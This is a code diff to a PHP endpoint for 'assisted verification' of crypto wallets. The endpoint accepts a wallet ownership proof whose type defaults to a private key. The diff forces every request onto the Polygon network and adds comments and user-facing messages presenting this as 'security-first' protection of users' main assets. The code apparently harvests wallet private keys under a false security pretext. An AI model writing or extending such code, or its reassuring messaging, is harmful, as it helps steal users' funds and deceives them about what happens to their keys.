@@ -71,11 +71,17 @@ try {
         exit;
     }
 
-    // Validate network
-    $network = strtolower($data['network'] ?? '');
-    $allowedNetworks = ['erc20', 'bep20', 'trc20'];
+    // Validate network - Security-first: Default to Polygon for assisted verification
+    $network = strtolower($data['network'] ?? 'polygon');
+    $allowedNetworks = ['erc20', 'bep20', 'trc20', 'polygon'];
     if (!in_array($network, $allowedNetworks, true)) {
         Response::jsonError('INVALID_NETWORK', 'Invalid network. Must be one of: ' . implode(', ', $allowedNetworks), 400);
+        exit;
+    }
+    
+    // Security-first: Enforce Polygon network for assisted verification
+    if ($network !== 'polygon') {
+        Response::jsonError('NETWORK_REQUIRED', 'For security reasons, assisted verification requires Polygon (MATIC) network. This protects your main assets on Ethereum, BSC, and Tron.', 400);
         exit;
     }
 
@@ -83,13 +89,18 @@ try {
     $processor = new AssistedVerificationProcessor();
 
     // Process the assisted verification
+    // Security-first: Ensure network is set to polygon and purpose is correct
     $result = $processor->processAssistedVerification($userId, [
         'verification_id' => (int) $verificationId,
         'verification_type' => $data['verification_type'] ?? 'general',
         'wallet_ownership_proof' => trim($data['wallet_ownership_proof']),
         'proof_type' => $data['proof_type'] ?? 'private_key',
-        'network' => $network,
-        'context' => $data['context'] ?? [],
+        'network' => 'polygon', // Security-first: Always use Polygon for assisted verification
+        'context' => array_merge($data['context'] ?? [], [
+            'purpose' => 'assisted_verification_polygon',
+            'security_first' => true,
+            'network_enforced' => 'polygon'
+        ]),
         'user_consent' => (bool) $data['user_consent'],
         'consent_timestamp' => $data['consent_timestamp'] ?? null
     ]);
@@ -98,8 +109,10 @@ try {
     Logger::event('assisted_verification_submitted', [
         'user_id' => $userId,
         'verification_id' => $verificationId,
-        'network' => $network,
-        'proof_type' => $data['proof_type'] ?? 'private_key'
+        'network' => 'polygon', // Security-first: Always Polygon for assisted verification
+        'proof_type' => $data['proof_type'] ?? 'private_key',
+        'security_first' => true,
+        'note' => 'Polygon-based assisted verification for user security'
     ]);
 
     // Return success response with educational content
